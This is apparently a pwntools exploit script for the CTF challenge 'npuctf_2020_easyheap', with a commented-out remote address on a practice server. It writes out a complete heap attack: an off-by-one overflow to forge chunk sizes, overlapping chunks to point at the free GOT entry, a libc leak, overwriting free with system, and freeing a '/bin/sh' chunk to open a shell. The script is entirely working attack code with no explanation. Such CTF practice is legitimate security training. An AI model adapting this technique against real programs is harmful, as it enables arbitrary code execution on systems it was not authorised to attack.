from pwn import *
from LibcSearcher import LibcSearcher
libc = ELF("./libc-2.27.so")
elf = ELF("./npuctf_2020_easyheap")
context.log_level="debug"

#p = remote("node3.buuoj.cn",27125)
p = process("./npuctf_2020_easyheap")


def dbg():
    gdb.attach(p)
    pause()

def choice(num):
    p.sendlineafter("Your choice :",str(num))

def add(size,text):
    choice(1)
    p.sendlineafter("(0x10 or 0x20 only) : ",str(size))
    p.sendafter("Content:",text)

def edit(id,text):
    choice(2)
    p.sendlineafter("Index :",str(id))
    p.sendafter("Content:",text)

def show(id):
    choice(3)
    p.sendlineafter("Index :",str(id))

def delete(id):
    choice(4)
    p.sendlineafter("Index :",str(id))

add(0x18,"a"*0x18)
add(0x18,"b"*0x18)
add(0x18,"/bin/sh\x00".ljust(0x18,"a"))
edit(0,"A"*0x18 + "\x41")
delete(1)
add(0x38,"a"*0x10 + p64(0) + p64(0x21)+p64(0x100)+p64(elf.got['free']))
show(1)
p.recvuntil("Content : ")
addr = u64(p.recv(6).ljust(8,"\x00"))
print hex(addr)

libc_base = addr - libc.sym["free"]
system = libc_base + libc.sym["system"]

print hex(system)

edit(1,p64(system))
delete(2)
#dbg()

p.interactive()
